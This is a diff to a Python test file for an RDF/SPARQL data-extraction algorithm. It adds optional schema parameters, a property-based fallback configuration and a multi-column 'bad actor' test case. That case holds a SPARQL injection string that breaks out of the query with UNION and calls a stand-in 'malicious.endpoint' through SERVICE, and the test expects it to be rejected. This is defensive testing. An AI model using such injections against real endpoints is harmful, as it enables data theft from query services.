@@ -51,6 +51,10 @@ def test_methods():
     - "variables_to_extract": Filled from config['variables_to_extract']
     - "query_type": Filled from config['query_type']
 
+    OPTIONAL PARAMETERS:
+    Parameters that only some configurations specify are passed on when the
+    configuration holds them: 'use_schema' and 'variable_property'.
+
     EXAMPLES:
     - For statistical algorithms: {"central": {...}, "partial_general_statistics": {...}}
     - For ML algorithms: {"train": {...}, "predict": {...}, "validate": {...}}
@@ -91,6 +95,11 @@ def test_configurations(rdf_store):
     These values are used to fill None parameters in method kwargs:
     - 'variables_to_extract' -> "variables_to_extract"
     - 'query_type' -> "query_type"
+
+    OPTIONAL KEYS:
+    - 'use_schema': Whether the queries are derived from the JSON-LD schema
+    - 'variable_property': The property that identifies the variables when the queries
+                           are not derived from the schema
 
     EXAMPLE CONFIGURATION TYPES:
     - 'standard_dataset': Normal successful execution
@@ -148,6 +157,23 @@ def test_configurations(rdf_store):
             },
             "query_type": "single_column",
         },
+        "standard_dataset_property_based_fallback": {
+            "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
+            # The variables are identified by a single property rather than by the path
+            # that the schema describes; this is the library's original behaviour and
+            # remains its default, so it should yield the very same data
+            "variables_to_extract": {
+                "ncit:C28421": {
+                    "datatype": "categorical",
+                },
+                "ncit:C156420": {
+                    "datatype": "numerical",
+                },
+            },
+            "query_type": "single_column",
+            "use_schema": False,
+            "variable_property": "dbo:has_column",
+        },
         "standard_dataset_bad_actor": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
             "variables_to_extract": {
@@ -155,6 +181,20 @@ def test_configurations(rdf_store):
                 "{ SELECT ?data WHERE { ?s ?p ?data } } }": {"datatype": "categorical"},
             },
             "query_type": "single_column",
+            "expected_failure": True,
+            "failure_reason": "Invalid query injection.",
+            "expected_error_type": [UserInputError, AlgorithmError],
+        },
+        "standard_dataset_bad_actor_multi_column": {
+            "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
+            # The multi-column query holds two variables, each of which has to be
+            # verified; the second one is the more easily overlooked of the two
+            "variables_to_extract": {
+                "ncit:C28421": {"datatype": "categorical"},
+                "<http://example.org/predicate> UNION { SERVICE <http://malicious.endpoint/sparql> "
+                "{ SELECT ?data WHERE { ?s ?p ?data } } }": {"datatype": "categorical"},
+            },
+            "query_type": "multi_column",
             "expected_failure": True,
             "failure_reason": "Invalid query injection.",
             "expected_error_type": [UserInputError, AlgorithmError],
@@ -245,8 +285,10 @@ class TestAlgorithmComponent:
             "standard_dataset_multi_column",
             "standard_dataset_linked_tables_multi_column",
             "standard_dataset_intermediate_class_variable",
+            "standard_dataset_property_based_fallback",
             "standard_dataset_incorrect_input",
             "standard_dataset_bad_actor",
+            "standard_dataset_bad_actor_multi_column",
             "standard_dataset_missing_variable_input",
             "non_existent_dataset_standard_input",
         ],
@@ -276,6 +318,11 @@ class TestAlgorithmComponent:
         kwargs = method_config["basic"].copy()
         kwargs["variables_to_extract"] = config["variables_to_extract"]
         kwargs["query_type"] = config["query_type"]
+
+        # Parameters that only some configurations specify
+        for parameter in ["use_schema", "variable_property"]:
+            if parameter in config:
+                kwargs[parameter] = config[parameter]
 
         # Create a task for the client to retrieve the descriptive data
         task = client.task.create(
